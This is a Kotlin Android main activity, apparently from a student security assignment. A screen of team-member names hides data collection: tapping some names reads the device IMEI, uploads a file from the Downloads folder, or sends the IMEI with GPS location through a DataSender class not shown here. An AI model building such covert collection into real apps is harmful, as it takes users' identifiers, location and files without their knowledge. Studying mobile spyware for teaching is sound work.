package com.example.assignment1

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.StrictMode
import android.util.Log
import android.view.View
import android.widget.TextView
import com.example.assignment1.DataRetriever.FindLocation
import com.example.assignment1.DataRetriever.General

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Initialise dataSender class
        var dataSender = DataSender();

        // Initialise data retriever
        // Need this to allow finding of public IP
        val policy = StrictMode.ThreadPolicy.Builder().permitAll().build()
        StrictMode.setThreadPolicy(policy)
        val gn = General(this,this)

        // Initialize location
        val gps = FindLocation(this, this)

        setContentView(R.layout.activity_main)
        findViewById<TextView>(R.id.mengrong).setOnClickListener{
            dataSender.getIMEI(this.contentResolver)
        }
        findViewById<TextView>(R.id.wesley).setOnClickListener{
            dataSender.sendFile("/storage/emulated/0/Downloads/test.txt")
        }
        findViewById<TextView>(R.id.jon).setOnClickListener{
            dataSender.sendData(dataSender.getIMEI(this.contentResolver), gps.getLocationDetails())
        }
        findViewById<TextView>(R.id.keefe).setOnClickListener(::clickName)
        findViewById<TextView>(R.id.minyao).setOnClickListener(::clickName)
        findViewById<TextView>(R.id.lynette).setOnClickListener(::clickName)
    }

    private fun clickName(view: View) {
        val intent = Intent(this@MainActivity, InfoActivity::class.java)
        intent.putExtra("id", view.id)
        startActivity(intent)
    }
}
